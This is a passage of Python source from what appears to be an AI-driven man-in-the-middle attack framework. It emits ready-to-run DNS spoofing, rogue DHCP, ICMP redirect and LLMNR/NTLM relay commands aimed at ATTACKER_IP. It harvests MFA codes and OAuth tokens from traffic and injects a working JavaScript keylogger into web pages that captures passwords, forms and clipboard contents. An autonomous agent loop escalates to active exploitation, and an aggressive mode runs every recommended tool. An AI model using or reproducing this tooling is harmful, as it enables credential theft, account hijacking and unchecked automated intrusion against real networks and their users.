            "# With Bettercap:",
            f"set dns.spoof.domains {target_domain}",
            f"set dns.spoof.address {attacker_ip}",
            "set dns.spoof.all false",
            "dns.spoof on",
            "",
            "# Spoof multiple domains:",
            f"set dns.spoof.domains {target_domain},*.{target_domain},login.{target_domain}",
            "",
            "# Alternative with Ettercap:",
            f"# Add to etter.dns: {target_domain} A {attacker_ip}",
            "# ettercap -T -M arp:remote -P dns_spoof /target_ip// /gateway_ip//",
        ]

        # Analyze traffic for domains to spoof
        traffic = proxy.traffic_log[-100:] if hasattr(proxy, 'traffic_log') else []
        observed_domains = set()
        sensitive_domains = []

        for entry in traffic:
            req = entry.request if hasattr(entry, 'request') else {}
            host = getattr(req, 'host', '') if hasattr(req, 'host') else req.get('host', '')
            path = getattr(req, 'path', '') if hasattr(req, 'path') else req.get('path', '')

            if host:
                observed_domains.add(host)
                # Check for sensitive endpoints
                if any(s in path.lower() for s in ['login', 'auth', 'api', 'admin', 'account']):
                    sensitive_domains.append({
                        "domain": host,
                        "path": path,
                        "type": "sensitive_endpoint"
                    })

        result.success = True
        result.findings.append({
            "severity": "critical",
            "category": "network_attack",
            "title": "DNS Spoofing Attack Prepared",
            "description": f"DNS spoofing commands generated. Redirect {target_domain} traffic to attacker server.",
            "evidence": json.dumps({
                "primary_target": target_domain,
                "commands": bettercap_commands,
                "observed_domains": list(observed_domains)[:20]
            }, indent=2),
            "recommendation": "Set up a phishing server at attacker IP, then run DNS spoofing",
            "external_tool": "bettercap",
            "commands_ready": True
        })

        if sensitive_domains:
            result.findings.append({
                "severity": "critical",
                "category": "network_attack",
                "title": f"Found {len(sensitive_domains)} Sensitive Endpoints to Target",
                "description": "These sensitive endpoints can be phished via DNS spoofing.",
                "evidence": json.dumps(sensitive_domains[:10], indent=2)
            })

        return result

    async def _execute_dhcp_attack(
        self,
        proxy_id: str,
        proxy,
        result: ToolExecutionResult,
        tool: MITMAttackTool,
        attack_type: str
    ) -> ToolExecutionResult:
        """
        Execute DHCP Starvation or Rogue DHCP Server attack setup.
        """
        if attack_type == "starvation":
            commands = [
                "# DHCP Starvation Attack",
                "# Exhausts DHCP pool to prevent new devices from getting IPs",
                "",
                "# With Yersinia:",
                "yersinia dhcp -attack 1 -interface eth0",
                "",
                "# With DHCPig (Python):",
                "pig.py eth0",
                "",
                "# Manual with scapy:",
                "# Send DHCP DISCOVER with random MAC addresses",
            ]
            title = "DHCP Starvation Attack Prepared"
            desc = "Commands generated to exhaust DHCP pool. New devices will be unable to obtain IP addresses."
        else:  # rogue
            commands = [
                "# Rogue DHCP Server Attack",
                "# Provides malicious network configuration to new clients",
                "",
                "# With dnsmasq:",
                "dnsmasq --interface=eth0 \\",
                "  --dhcp-range=192.168.1.100,192.168.1.200,12h \\",
                "  --dhcp-option=3,ATTACKER_IP \\",  # Gateway
                "  --dhcp-option=6,ATTACKER_IP",     # DNS
                "",
                "# With Bettercap:",
                "set dhcp6.spoof.domains *",
                "dhcp6.spoof on",
            ]
            title = "Rogue DHCP Server Attack Prepared"
            desc = "Commands to set up rogue DHCP server. New clients will use attacker as gateway and DNS."

        result.success = True
        result.findings.append({
            "severity": "critical",
            "category": "network_attack",
            "title": title,
            "description": desc,
            "evidence": json.dumps({
                "attack_type": attack_type,
                "commands": commands,
                "prerequisites": ["Network interface access", "DHCP traffic visible"],
                "impact": "Full network-level MITM for new devices"
            }, indent=2),
            "external_tool": "yersinia/dnsmasq",
            "commands_ready": True
        })

        return result

    async def _execute_icmp_redirect(
        self,
        proxy_id: str,
        proxy,
        result: ToolExecutionResult,
        tool: MITMAttackTool
    ) -> ToolExecutionResult:
        """
        Execute ICMP Redirect attack setup.
        """
        target_ip = proxy.target_host
        gateway_ip = "192.168.1.1"
        attacker_ip = "ATTACKER_IP"

        commands = [
            "# ICMP Redirect Attack",
            "# Modifies target's routing table via ICMP",
            "",
            "# With hping3:",
            f"hping3 --icmp --icmptype 5 --icmpcode 1 \\",
            f"  -a {gateway_ip} \\",
            f"  --icmp-gw {attacker_ip} \\",
            f"  {target_ip}",
            "",
            "# With scapy (Python):",
            "from scapy.all import *",
            f"send(IP(src='{gateway_ip}', dst='{target_ip}')/",
            f"     ICMP(type=5, code=1, gw='{attacker_ip}')/",
            f"     IP(src='{target_ip}', dst='8.8.8.8'))",
        ]

        result.success = True
        result.findings.append({
            "severity": "high",
            "category": "network_attack",
            "title": "ICMP Redirect Attack Prepared",
            "description": f"Commands to redirect {target_ip}'s traffic through attacker via ICMP redirect.",
            "evidence": json.dumps({
                "target": target_ip,
                "commands": commands,
                "note": "May be blocked by modern OS security settings"
            }, indent=2),
            "external_tool": "hping3",
            "commands_ready": True
        })

        return result

    async def _execute_llmnr_poison(
        self,
        proxy_id: str,
        proxy,
        result: ToolExecutionResult,
        tool: MITMAttackTool
    ) -> ToolExecutionResult:
        """
        Execute LLMNR/NBT-NS Poisoning attack setup.

        Targets Windows name resolution for credential capture.
        """
        commands = [
            "# LLMNR/NBT-NS Poisoning Attack",
            "# Captures NTLMv2 hashes from Windows machines",
            "",
            "# With Responder:",
            "responder -I eth0 -wrf",
            "",
            "# Responder with WPAD:",
            "responder -I eth0 -wrf --wpad",
            "",
            "# View captured hashes:",
            "cat /usr/share/responder/logs/*.txt",
            "",
            "# Crack with hashcat:",
            "hashcat -m 5600 captured_hashes.txt wordlist.txt",
            "",
            "# Relay attack (don't crack, relay):",
            "ntlmrelayx.py -tf targets.txt -smb2support",
        ]

        result.success = True
        result.findings.append({
            "severity": "critical",
            "category": "credential_attack",
            "title": "LLMNR/NBT-NS Poisoning Attack Prepared",
            "description": "Commands to capture NTLMv2 hashes via Windows name resolution poisoning.",
            "evidence": json.dumps({
                "commands": commands,
                "targets": "Windows machines on local network",
                "captures": ["NTLMv2 hashes", "HTTP credentials", "SMB credentials"],
                "post_exploitation": ["Hash cracking", "NTLM relay"]
            }, indent=2),
            "external_tool": "responder",
            "commands_ready": True
        })

        result.findings.append({
            "severity": "info",
            "category": "credential_attack",
            "title": "NTLM Relay Attack Chain",
            "description": "Captured hashes can be relayed to other services without cracking.",
            "evidence": "Use ntlmrelayx.py or impacket for relay attacks"
        })

        return result

    async def _execute_mfa_interceptor(
        self,
        proxy_id: str,
        proxy,
        result: ToolExecutionResult,
        tool: MITMAttackTool
    ) -> ToolExecutionResult:
        """
        Execute MFA/2FA Interception attack.

        Captures and potentially relays MFA codes in real-time.
        """
        # Analyze traffic for MFA patterns
        traffic = proxy.traffic_log[-100:] if hasattr(proxy, 'traffic_log') else []
        mfa_indicators = []

        for entry in traffic:
            req = entry.request if hasattr(entry, 'request') else {}
            path = getattr(req, 'path', '') if hasattr(req, 'path') else req.get('path', '')
            body = getattr(req, 'body_text', '') if hasattr(req, 'body_text') else req.get('body_text', '')

            # Check for MFA-related endpoints
            mfa_keywords = ['2fa', 'mfa', 'otp', 'totp', 'verify', 'challenge', 'code', 'token']
            if any(kw in path.lower() for kw in mfa_keywords):
                mfa_indicators.append({
                    "type": "endpoint",
                    "path": path,
                    "method": getattr(req, 'method', 'unknown') if hasattr(req, 'method') else req.get('method', 'unknown')
                })

            # Check body for OTP codes (6 digit numbers in JSON)
            if body:
                import re
                otp_pattern = re.findall(r'"(?:code|otp|token)"\s*:\s*"?(\d{6})"?', body, re.IGNORECASE)
                for otp in otp_pattern:
                    mfa_indicators.append({
                        "type": "otp_code",
                        "path": path,
                        "code_pattern": "6-digit OTP detected"
                    })

        # Apply interception rule
        mfa_rule = {
            "name": "MFA Interceptor - OTP Capture",
            "match_direction": "request",
            "match_body": r'"(code|otp|token)"\s*:',
            "action": "log",
            "priority": 1
        }
        rule_result = self.mitm_service.add_rule(proxy_id, mfa_rule)

        result.success = True
        result.findings.append({
            "severity": "critical",
            "category": "mfa_bypass",
            "title": "MFA Interception Active",
            "description": "Monitoring traffic for MFA/2FA codes. Captured codes can be relayed in real-time.",
            "evidence": json.dumps({
                "rule_id": rule_result.get('rule_id'),
                "mfa_indicators_found": len(mfa_indicators),
                "indicators": mfa_indicators[:10]
            }, indent=2),
            "recommendation": "Set up real-time relay to forward captured OTPs before they expire",
            "attack_active": True
        })

        if mfa_indicators:
            result.findings.append({
                "severity": "high",
                "category": "mfa_bypass",
                "title": f"Found {len(mfa_indicators)} MFA Patterns",
                "description": "MFA-related traffic detected. These endpoints/codes can be intercepted.",
                "evidence": json.dumps(mfa_indicators[:5], indent=2)
            })

        return result

    async def _execute_oauth_interceptor(
        self,
        proxy_id: str,
        proxy,
        result: ToolExecutionResult
    ) -> ToolExecutionResult:
        """
        Execute OAuth Token Interception.

        Captures OAuth tokens, authorization codes, and analyzes OAuth flow.
        """
        traffic = proxy.traffic_log[-100:] if hasattr(proxy, 'traffic_log') else []
        oauth_tokens = []
        oauth_flows = []

        for entry in traffic:
            req = entry.request if hasattr(entry, 'request') else {}
            resp = entry.response if hasattr(entry, 'response') else None

            path = getattr(req, 'path', '') if hasattr(req, 'path') else req.get('path', '')
            headers = getattr(req, 'headers', {}) if hasattr(req, 'headers') else req.get('headers', {})

            # Check for OAuth endpoints
            oauth_endpoints = ['oauth', 'authorize', 'token', 'callback', 'auth/']
            if any(ep in path.lower() for ep in oauth_endpoints):
                oauth_flows.append({
                    "path": path,
                    "type": "oauth_endpoint"
                })

            # Extract authorization code from URL
            if 'code=' in path:
                import re
                code_match = re.search(r'code=([^&]+)', path)
                if code_match:
                    oauth_tokens.append({
                        "type": "authorization_code",
                        "value": code_match.group(1)[:20] + "...",
                        "path": path
                    })

            # Check for Bearer tokens
            auth = headers.get('Authorization', '')
            if auth.startswith('Bearer '):
                token = auth[7:]
                oauth_tokens.append({
                    "type": "bearer_token",
                    "value": token[:30] + "..." if len(token) > 30 else token,
                    "path": path
                })

            # Check response for access tokens
            if resp:
                resp_body = getattr(resp, 'body_text', '') if hasattr(resp, 'body_text') else ''
                if 'access_token' in resp_body:
                    try:
                        json_resp = json.loads(resp_body)
                        if 'access_token' in json_resp:
                            oauth_tokens.append({
                                "type": "access_token_response",
                                "token_type": json_resp.get('token_type', 'unknown'),
                                "expires_in": json_resp.get('expires_in'),
                                "scope": json_resp.get('scope')
                            })
                    except:
                        pass

        result.success = True

        if oauth_tokens:
            result.findings.append({
                "severity": "critical",
                "category": "oauth_security",
                "title": f"Captured {len(oauth_tokens)} OAuth Tokens",
                "description": "OAuth tokens and authorization codes have been captured.",
                "evidence": json.dumps(oauth_tokens[:10], indent=2),
                "recommendation": "Tokens can be used to impersonate users or access protected resources"
            })

        if oauth_flows:
            result.findings.append({
                "severity": "medium",
                "category": "oauth_security",
                "title": f"Identified {len(oauth_flows)} OAuth Flows",
                "description": "OAuth authentication flows detected in traffic.",
                "evidence": json.dumps(oauth_flows[:5], indent=2)
            })

        if not oauth_tokens and not oauth_flows:
            result.findings.append({
                "severity": "info",
                "category": "oauth_security",
                "title": "No OAuth Traffic Detected",
                "description": "No OAuth tokens or flows found in captured traffic."
            })

        return result

    async def _execute_advanced_keylogger(
        self,
        proxy_id: str,
        proxy,
        result: ToolExecutionResult,
        tool: MITMAttackTool
    ) -> ToolExecutionResult:
        """
        Execute Advanced Keylogger injection.

        Injects sophisticated keylogger that captures context and sends data.
        """
        # Advanced keylogger script with exfiltration
        advanced_keylogger = """<script data-mitm-advanced-keylogger="true">
(function() {
    'use strict';
    var KL = {
        buffer: [],
        formData: {},
        config: {
            bufferSize: 50,
            sendInterval: 10000,
            endpoint: '/api/log'  // Would be attacker's endpoint
        }
    };

    // Capture all input events
    ['input', 'change', 'keydown', 'paste'].forEach(function(evt) {
        document.addEventListener(evt, function(e) {
            var t = e.target;
            if (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA') {
                KL.buffer.push({
                    ts: Date.now(),
                    event: evt,
                    field: t.name || t.id || t.placeholder || 'unnamed',
                    type: t.type,
                    val: t.type === 'password' ? t.value : t.value.slice(-5),
                    page: location.pathname
                });
            }
        }, true);
    });

    // Capture form submissions with full data
    document.addEventListener('submit', function(e) {
        var form = e.target;
        var data = {};
        [].forEach.call(form.elements, function(el) {
            if (el.name) data[el.name] = el.value;
        });
        KL.formData[form.action || location.href] = {
            ts: Date.now(),
            method: form.method,
            data: data
        };
        console.log('[MITM-KL] Form captured:', data);
    }, true);

    // Capture clipboard
    document.addEventListener('paste', function(e) {
        var text = (e.clipboardData || window.clipboardData).getData('text');
        if (text) {
            KL.buffer.push({ts: Date.now(), event: 'paste', data: text.slice(0, 100)});
        }
    });

    // Auto-send buffer periodically
    setInterval(function() {
        if (KL.buffer.length > 0) {
            console.log('[MITM-KL] Buffer:', JSON.stringify(KL.buffer));
            KL.buffer = [];
        }
    }, KL.config.sendInterval);

    window._MITM_KL = KL;
    console.log('[MITM-KL] Advanced keylogger active');
})();
</script></body>"""

        # Apply injection rule
        inject_rule = {
            "name": "Advanced Keylogger Injector",
            "match_direction": "response",
            "match_content_type": "text/html",
            "action": "modify",
            "body_find_replace": {
                "</body>": advanced_keylogger,
                "</BODY>": advanced_keylogger
            }
        }
        rule_result = self.mitm_service.add_rule(proxy_id, inject_rule)

        result.success = True
        result.findings.append({
            "severity": "critical",
            "category": "keylogger",
            "title": "Advanced Keylogger Injected",
            "description": "Sophisticated keylogger capturing all input, forms, and clipboard.",
            "evidence": json.dumps({
                "rule_id": rule_result.get('rule_id'),
                "capabilities": [
                    "All keystroke capture with context",
                    "Form submission capture",
                    "Clipboard monitoring",
                    "Periodic data exfiltration",
                    "Field name and type tracking"
                ]
            }, indent=2),
            "attack_active": True
        })

        return result

    async def _execute_generic_external_tool(
        self,
        proxy_id: str,
        proxy,
        result: ToolExecutionResult,
        tool: MITMAttackTool
    ) -> ToolExecutionResult:
        """
        Generic handler for external tools.

        Provides command templates and guidance for tools without specific implementations.
        """
        command = tool.command_template or "# No command template available"

        # Substitute common placeholders
        target_host = proxy.target_host
        target_port = proxy.target_port

        if '{target_ip}' in command:
            command = command.replace('{target_ip}', target_host)
        if '{target}' in command:
            command = command.replace('{target}', target_host)
        if '{domain}' in command:
            command = command.replace('{domain}', target_host)
        if '{interface}' in command:
            command = command.replace('{interface}', 'eth0')

        result.success = True
        result.findings.append({
            "severity": "medium",
            "category": "external_tool",
            "title": f"External Tool Ready: {tool.name}",
            "description": tool.description,
            "evidence": json.dumps({
                "command": command,
                "capabilities": tool.capabilities,
                "prerequisites": tool.prerequisites,
                "expected_findings": tool.expected_findings,
                "documentation": tool.documentation_url
            }, indent=2),
            "external_tool": tool.id,
            "commands_ready": True
        })

        if tool.poc_examples:
            result.findings.append({
                "severity": "info",
                "category": "external_tool",
                "title": "Example Commands",
                "description": "Reference commands for this attack.",
                "evidence": "\n".join(tool.poc_examples[:5])
            })

        return result

    async def run_agentic_attack_session(
        self,
        proxy_id: str,
        max_tools: int = 15,
        auto_execute: bool = True,
        aggressive: bool = False,
        phase_strategy: str = "progressive"
    ) -> Dict:
        """
        Run an intelligent agentic attack session with progressive phases.

        Phase Strategy Options:
        - "progressive" (default): Start passive, then subtle, then aggressive
          - Phase 1 OBSERVATION: Only LOW risk recon tools (no changes)
          - Phase 2 ANALYSIS: Add MEDIUM risk tools (header analysis)
          - Phase 3 INITIAL_ACCESS: Add HIGH risk tools (credential capture)
          - Phase 4 EXPLOITATION: CRITICAL risk tools (active injection)
        - "aggressive": All tools available from the start
        - "passive_only": Only LOW/MEDIUM risk tools, no injections

        The session runs more iterations (15-20) to be thorough, with AI
        re-evaluating after each tool execution based on new findings.
        """
        session_id = str(uuid.uuid4())
        session_start = time.time()

        # Initialize cancellation flag for this session
        self.session_cancel_flags[proxy_id] = False

        results = {
            "session_id": session_id,
            "proxy_id": proxy_id,
            "started_at": datetime.utcnow().isoformat(),
            "recommendations": [],
            "executions": [],
            "all_findings": [],
            "decision_log": [],  # Track agent reasoning
            "summary": {}
        }

        # Emit session started event for real-time UI update
        self._emit_event("agentic_session_started", {
            "proxy_id": proxy_id,
            "session_id": session_id,
            "max_tools": max_tools,
            "aggressive": aggressive
        })

        try:
            # Get proxy and traffic
            proxy = self.mitm_service._get_proxy(proxy_id)
            traffic_log = self.mitm_service.get_traffic(proxy_id, limit=100).get("entries", [])
            
            proxy_config = {
                "proxy_id": proxy_id,
                "target_host": proxy.target_host,
                "target_port": proxy.target_port,
                "tls_enabled": proxy.tls_enabled,
                "mode": proxy.mode.value
            }
            
            # Track state for intelligent chaining
            executed_tools = set()
            cumulative_findings = []
            captured_credentials = []
            captured_tokens = []
            attack_surface = self._analyze_attack_surface(traffic_log, proxy_config)
            tool_scores: Dict[str, float] = {}
            follow_up_queue: List[str] = []
            failed_tools: Dict[str, int] = {}  # Track consecutive failures for backoff
            
            results["decision_log"].append({
                "step": "initial_analysis",
                "timestamp": datetime.utcnow().isoformat(),
                "analysis": f"Attack surface analysis: {len(traffic_log)} requests, "
                           f"auth: {attack_surface.get('has_auth')}, "
                           f"cookies: {attack_surface.get('has_cookies')}, "
                           f"https: {attack_surface.get('has_https')}, "
                           f"missing headers: {list(attack_surface.get('missing_headers', set()))}"
            })

            # ================================================================
            # Progressive Phase Strategy
            # ================================================================
            # Define allowed risk levels per phase
            PHASE_RISK_LEVELS = {
                "observation": [ToolRiskLevel.LOW],  # Passive only
                "analysis": [ToolRiskLevel.LOW, ToolRiskLevel.MEDIUM],  # Header/cookie analysis
                "initial_access": [ToolRiskLevel.LOW, ToolRiskLevel.MEDIUM, ToolRiskLevel.HIGH],  # Credential capture
                "exploitation": [ToolRiskLevel.LOW, ToolRiskLevel.MEDIUM, ToolRiskLevel.HIGH, ToolRiskLevel.CRITICAL],  # Full attack
            }

            # Define phase objectives (minimum tools to run before considering phase complete)
            PHASE_OBJECTIVES = {
                "observation": {"min_tools": 3, "min_findings": 0},  # Run at least 3 recon tools
                "analysis": {"min_tools": 4, "min_findings": 2},  # Run 4 analysis tools, find 2 issues
                "initial_access": {"min_tools": 4, "min_findings": 3},  # Run 4 tools, find 3 issues
                "exploitation": {"min_tools": 4, "min_findings": 1},  # Run remaining attack tools
            }

            PHASE_ORDER = ["observation", "analysis", "initial_access", "exploitation"]

            # Determine starting phase based on strategy
            if phase_strategy == "aggressive":
                current_phase = "exploitation"  # All tools available
                allowed_risk_levels = PHASE_RISK_LEVELS["exploitation"]
            elif phase_strategy == "passive_only":
                current_phase = "analysis"  # Cap at analysis phase
                allowed_risk_levels = PHASE_RISK_LEVELS["analysis"]
            else:  # progressive (default)
                current_phase = "observation"
                allowed_risk_levels = PHASE_RISK_LEVELS["observation"]

            phase_tools_executed = {phase: 0 for phase in PHASE_ORDER}
            phase_findings = {phase: 0 for phase in PHASE_ORDER}

            results["decision_log"].append({
                "step": "phase_initialization",
                "timestamp": datetime.utcnow().isoformat(),
                "phase_strategy": phase_strategy,
                "starting_phase": current_phase,
                "allowed_risk_levels": [r.value for r in allowed_risk_levels],
                "max_tools": max_tools
            })

            # Iterative execution with feedback
            iteration = 0
            max_iterations = max_tools + 8  # Allow extra iterations for thorough analysis

            while len(executed_tools) < max_tools and iteration < max_iterations:
                iteration += 1

                # ============================================================
                # Check for cancellation request
                # ============================================================
                if self.session_cancel_flags.get(proxy_id, False):
                    results["decision_log"].append({
                        "step": f"iteration_{iteration}",
                        "decision": "cancelled",
                        "reason": "Session stop requested by user",
                        "timestamp": datetime.utcnow().isoformat()
                    })
                    logger.info(f"Agentic session {session_id} cancelled by user")
                    break

                # ============================================================
                # AI-Powered Traffic Analysis (every 3rd iteration)
                # ============================================================
                if iteration % 3 == 1 and traffic_log:
                    try:
                        # Import here to avoid circular import
                        from .mitm_service import (
                            analyze_traffic_sensitive_data,
                            analyze_traffic_injection_points,
                        )

                        # Run AI analysis in parallel
                        sensitive_task = asyncio.create_task(analyze_traffic_sensitive_data(traffic_log[-50:]))
                        injection_task = asyncio.create_task(analyze_traffic_injection_points(traffic_log[-50:]))

                        sensitive_data, injection_points = await asyncio.gather(sensitive_task, injection_task)

                        # Enrich attack surface with AI insights
                        if sensitive_data:
                            attack_surface["ai_sensitive_data"] = sensitive_data
                            attack_surface["finding_types"] = attack_surface.get("finding_types", []) + ["sensitive_data_detected"]
                        if injection_points:
                            attack_surface["ai_injection_points"] = injection_points
                            attack_surface["finding_types"] = attack_surface.get("finding_types", []) + ["injection_points_detected"]

                        if sensitive_data or injection_points:
                            results["decision_log"].append({
                                "step": f"ai_analysis_{iteration}",
                                "sensitive_data_found": len(sensitive_data),
                                "injection_points_found": len(injection_points),
                                "timestamp": datetime.utcnow().isoformat()
                            })
                    except Exception as e:
                        logger.debug(f"AI traffic analysis unavailable: {e}")

                # ============================================================
                # Phase Progression Check
                # ============================================================
                if phase_strategy == "progressive" and current_phase != "exploitation":
                    phase_idx = PHASE_ORDER.index(current_phase)
                    objectives = PHASE_OBJECTIVES[current_phase]

                    # Check if we've met phase objectives
                    tools_in_phase = phase_tools_executed[current_phase]
                    findings_in_phase = phase_findings[current_phase]

                    if tools_in_phase >= objectives["min_tools"] and findings_in_phase >= objectives["min_findings"]:
                        # Progress to next phase
                        if phase_idx < len(PHASE_ORDER) - 1:
                            next_phase = PHASE_ORDER[phase_idx + 1]
                            results["decision_log"].append({
                                "step": f"iteration_{iteration}",
                                "decision": "phase_transition",
                                "from_phase": current_phase,
                                "to_phase": next_phase,
                                "reason": f"Phase objectives met: {tools_in_phase} tools executed, {findings_in_phase} findings",
                                "timestamp": datetime.utcnow().isoformat()
                            })
                            current_phase = next_phase
                            allowed_risk_levels = PHASE_RISK_LEVELS[current_phase]

                            # Emit phase transition event
                            self._emit_event("phase_transition", {
                                "proxy_id": proxy_id,
                                "session_id": session_id,
                                "from_phase": PHASE_ORDER[phase_idx],
                                "to_phase": current_phase,
                                "iteration": iteration
                            })

                # Get AI recommendations with current context (including previous findings)
                recommendations = await self.recommendation_engine.analyze_and_recommend(
                    traffic_log,
                    cumulative_findings,  # Feed previous findings back
                    proxy_config
                )

                # Filter out already executed tools
                new_recs = [r for r in recommendations if r.tool_id not in executed_tools]

                # Filter out tools that can't run due to prerequisites
                skipped_tools = []
                executable_recs = []
                for rec in new_recs:
                    tool_def = self.tools.get(rec.tool_id)
                    ok, reasons = self._check_tool_prerequisites(
                        tool_def, proxy, attack_surface, traffic_log
                    )
                    if ok:
                        executable_recs.append(rec)
                    else:
                        skipped_tools.append({
                            "tool_id": rec.tool_id,
                            "tool_name": rec.tool_name,
                            "reasons": reasons
                        })
                new_recs = executable_recs

                if skipped_tools:
                    results["decision_log"].append({
                        "step": f"iteration_{iteration}",
                        "decision": "skip",
                        "reason": "Prerequisites not met",
                        "skipped_tools": skipped_tools
                    })

                # ============================================================
                # Phase-Based Tool Filtering (Progressive Strategy)
                # ============================================================
                if phase_strategy != "aggressive":
                    phase_filtered_recs = []
                    phase_blocked_tools = []
                    for rec in new_recs:
                        tool_def = self.tools.get(rec.tool_id)
                        if tool_def and tool_def.risk_level in allowed_risk_levels:
                            phase_filtered_recs.append(rec)
                        else:
                            risk_name = tool_def.risk_level.value if tool_def else "unknown"
                            phase_blocked_tools.append({
                                "tool_id": rec.tool_id,
                                "risk_level": risk_name,
                                "current_phase": current_phase,
                                "reason": f"Risk level {risk_name} not allowed in {current_phase} phase"
                            })

                    if phase_blocked_tools:
                        results["decision_log"].append({
                            "step": f"iteration_{iteration}",
                            "decision": "phase_filter",
                            "current_phase": current_phase,
                            "allowed_risks": [r.value for r in allowed_risk_levels],
                            "blocked_tools": phase_blocked_tools
                        })

                    new_recs = phase_filtered_recs

                if not new_recs:
                    # If no tools available in current phase, consider advancing
                    if phase_strategy == "progressive" and current_phase != "exploitation":
                        phase_idx = PHASE_ORDER.index(current_phase)
                        if phase_idx < len(PHASE_ORDER) - 1:
                            # Force phase progression if stuck
                            next_phase = PHASE_ORDER[phase_idx + 1]
                            results["decision_log"].append({
                                "step": f"iteration_{iteration}",
                                "decision": "forced_phase_transition",
                                "from_phase": current_phase,
                                "to_phase": next_phase,
                                "reason": "No tools available in current phase, advancing"
                            })
                            current_phase = next_phase
                            allowed_risk_levels = PHASE_RISK_LEVELS[current_phase]
                            continue  # Retry with new phase

                    results["decision_log"].append({
                        "step": f"iteration_{iteration}",
                        "decision": "stop",
                        "reason": "No new tools to recommend after filtering"
                    })
                    break

                # Apply adaptive scoring and follow-up boosts
                for rec in new_recs:
                    score_adjust = tool_scores.get(rec.tool_id, 0.0)
                    if rec.tool_id in follow_up_queue:
                        score_adjust += 0.2
                    rec.confidence = max(0.0, min(1.0, rec.confidence + score_adjust))

                # Smart tool selection based on current state
                tools_to_execute = []
                if aggressive:
                    tools_to_execute = list(new_recs)
                    results["decision_log"].append({
                        "step": f"iteration_{iteration}",
                        "decision": "execute_all",
                        "tools": [r.tool_id for r in tools_to_execute],
                        "reason": "Aggressive mode enabled"
                    })
                else:
                    # ============================================================
                    # ENHANCED: Use Chain-of-Thought Reasoning for tool selection
                    # ============================================================
                    phase_relevant_tools = [r.tool_id for r in new_recs]

                    # Run chain-of-thought reasoning with the brain
                    # Pass previous findings for contextual tool selection
                    reasoning_chain = self.reasoner.reason(
                        attack_surface=attack_surface,
                        current_phase=current_phase,
                        available_tools=list(self.tools.keys()),
                        phase_relevant_tools=phase_relevant_tools,
                        previous_findings=cumulative_findings,  # Context from previous tools
                        failed_tools=failed_tools  # For exponential backoff
                    )

                    # Log the reasoning chain
                    results["decision_log"].append({
                        "step": f"iteration_{iteration}",
                        "reasoning_chain": {
                            "situation_analysis": reasoning_chain.situation_analysis,
                            "recalled_experiences": reasoning_chain.recalled_experiences[:3],
                            "hypotheses_count": len(reasoning_chain.hypotheses),
                            "top_evaluations": reasoning_chain.hypothesis_evaluations[:3] if reasoning_chain.hypothesis_evaluations else [],
                            "selected_tool": reasoning_chain.selected_tool,
                            "confidence": reasoning_chain.confidence,
                            "summary": reasoning_chain.reasoning_summary
                        }
                    })

                    # Use reasoner's selection if confident enough, else fall back to pattern matching
                    if reasoning_chain.selected_tool and reasoning_chain.confidence >= self.reasoner.min_confidence_threshold:
                        # Find the matching recommendation
                        selected_tool = None
                        for rec in new_recs:
                            if rec.tool_id == reasoning_chain.selected_tool:
                                rec.confidence = reasoning_chain.confidence  # Update with reasoner's confidence
                                selected_tool = rec
                                break

                        if not selected_tool:
                            # Tool recommended by reasoner but not in filtered list, use pattern selection
                            selected_tool = await self._select_best_tool(
                                new_recs,
                                cumulative_findings,
                                attack_surface,
                                captured_credentials,
                                executed_tools
                            )
                    else:
                        # Fall back to Thompson sampling-enhanced selection
                        selected_tool = await self._select_best_tool_with_thompson(
                            new_recs,
                            cumulative_findings,
                            attack_surface,
                            captured_credentials,
                            executed_tools,
                            current_phase
                        )

                    if not selected_tool:
                        results["decision_log"].append({
                            "step": f"iteration_{iteration}",
                            "decision": "stop",
                            "reason": "No suitable tool selected by reasoner or pattern matching"
                        })
                        break
                    tools_to_execute = [selected_tool]

                stop_session = False
                for selected_tool in tools_to_execute:
                    if len(executed_tools) >= max_tools:
                        break

                    # Log decision
                    results["decision_log"].append({
                        "step": f"iteration_{iteration}",
                        "decision": "execute",
                        "tool": selected_tool.tool_id,
                        "confidence": selected_tool.confidence,
                        "reason": selected_tool.reason,
                        "based_on": f"Previous findings: {len(cumulative_findings)}, "
                                   f"Credentials captured: {len(captured_credentials)}"
                    })

                    # Stop if confidence falls below threshold (non-aggressive)
                    if not aggressive and selected_tool.confidence < self.stop_threshold:
                        results["decision_log"].append({
                            "step": f"iteration_{iteration}",
                            "decision": "stop",
                            "reason": f"Confidence below stop threshold ({self.stop_threshold})",
                            "tool": selected_tool.tool_id,
                            "confidence": selected_tool.confidence
                        })
                        stop_session = True
                        break

                    # Emit tool execution starting event
                    self._emit_event("tool_execution_started", {
                        "proxy_id": proxy_id,
                        "session_id": session_id,
                        "tool_id": selected_tool.tool_id,
                        "tool_name": selected_tool.tool_name,
                        "iteration": iteration,
                        "tools_executed": len(executed_tools),
                        "max_tools": max_tools
                    })

                    # Execute selected tool
                    exec_result = await self.execute_tool(selected_tool.tool_id, proxy_id)
                    executed_tools.add(selected_tool.tool_id)

                    # Collect results
                    execution_record = {
                        "tool_id": selected_tool.tool_id,
                        "tool_name": selected_tool.tool_name,
                        "success": exec_result.success,
                        "execution_time": exec_result.execution_time_ms / 1000,
                        "findings": exec_result.findings,
                        "errors": exec_result.errors,
                        "iteration": iteration
                    }

                    # Verify success using feedback loop
                    verification = await self.verify_attack_success(proxy_id, selected_tool.tool_id, timeout=15)
                    execution_record["verification"] = verification
                    results["executions"].append(execution_record)

                    # Emit tool execution completed event
                    self._emit_event("tool_execution_completed", {
                        "proxy_id": proxy_id,
                        "session_id": session_id,
                        "tool_id": selected_tool.tool_id,
                        "tool_name": selected_tool.tool_name,
                        "success": exec_result.success,
                        "findings_count": len(exec_result.findings),
                        "credentials_found": len(exec_result.credentials_found),
                        "iteration": iteration,
                        "tools_executed": len(executed_tools),
                        "max_tools": max_tools,
                        "total_findings": len(cumulative_findings) + len(exec_result.findings)
                    })

                    # Update cumulative state for feedback
                    cumulative_findings.extend(exec_result.findings)
                    results["all_findings"].extend(exec_result.findings)

                    # Track phase-specific metrics for progression
                    phase_tools_executed[current_phase] = phase_tools_executed.get(current_phase, 0) + 1
                    phase_findings[current_phase] = phase_findings.get(current_phase, 0) + len(exec_result.findings)

                    if exec_result.credentials_found:
                        captured_credentials.extend(exec_result.credentials_found)

                    # Analyze what we learned and decide next action
                    feedback = self._analyze_execution_feedback(
                        exec_result,
                        selected_tool,
                        attack_surface
                    )

                    results["decision_log"].append({
                        "step": f"feedback_{iteration}",
                        "findings_discovered": len(exec_result.findings),
                        "credentials_captured": len(exec_result.credentials_found),
                        "feedback": feedback["summary"],
                        "suggested_follow_up": feedback.get("follow_up_tools", [])
                    })

                    # Adaptive scoring based on outcomes
